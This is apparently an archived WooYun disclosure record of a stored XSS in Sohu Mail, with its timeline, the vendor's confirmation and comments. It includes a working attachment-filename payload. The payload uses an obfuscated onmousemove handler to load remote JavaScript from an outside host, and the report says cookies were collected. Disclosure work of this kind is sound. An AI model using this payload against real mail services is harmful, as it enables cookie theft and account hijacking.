{"id": 4410, "wybug_id": "wooyun-2014-054403", "wybug_title": "搜狐邮箱存储型XSS(危害放大技巧)", "wybug_corp": "搜狐", "wybug_author": "超威蓝猫", "wybug_date": "2014-03-23 19:09", "wybug_open_date": "2014-05-07 19:09", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-07：\t细节向公众公开  简要描述： 搜狐邮箱存储型XSS(危害放大) 详细说明：  向搜狐邮箱发一封邮件，附件的名称带上单引号 ' 。\n\n天了噜，单引号 ' 变成了双引号 \" ！\n\n我们来插入onmousemove事件试试：\n\n\n\n成功alert(1)。但是触发区域只有那么小，看上去没什么危害。这个输出点位于span标签，我们看看span标签支持什么属性:\n\nspan标签在这里已经用了id和title属性。剩下class属性必须配合id属性来调用CSS中的样式。所以只能从style属性下手了。上传附件时抓包修改文件名:\n\n现在触发区域有这么大:\n\n\n\n加载外部js只需要上传附件时附件名修改为如下代码即可:\nMMMMMMMM' MMMMMMMMMM onmousemove='with(body)appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=String.fromCharCode(47,47,113,113,113,46,115,105,47,100,115,118,108,76,50)' style='font-size:80px'\n\n\nXSS收信平台收到了cookie:\n\n   漏洞证明：  如上   修复方案：  求礼物^ ^   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-03-24 09:56 厂商回复： 感谢支持。^_^ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-23 19:09 |    \t\t超级大菜鸟 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | <<<<<<<<<<<<<<<<<<<<<<<<________________...)\t\t \n  1L    \n     2014-03-23 19:31 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  关注下蓝毛    \n     2014-03-23 20:16 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  关注下蓝毛    \n     2014-03-23 20:27 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  关注下怎么放大的    \n     2014-03-23 20:37 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @mramydnei 嘛，就是style id class之类的..    \n     2014-03-23 23:04 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  关注下绿毛    \n     2014-05-07 23:16 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  确实字母很大    \n     2014-05-07 23:57 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  牛    \n     2014-05-08 01:19 |    \t\tweiweiwind \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 菜鸟学习中～)\t\t \n  为毛要转为“好奇葩~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}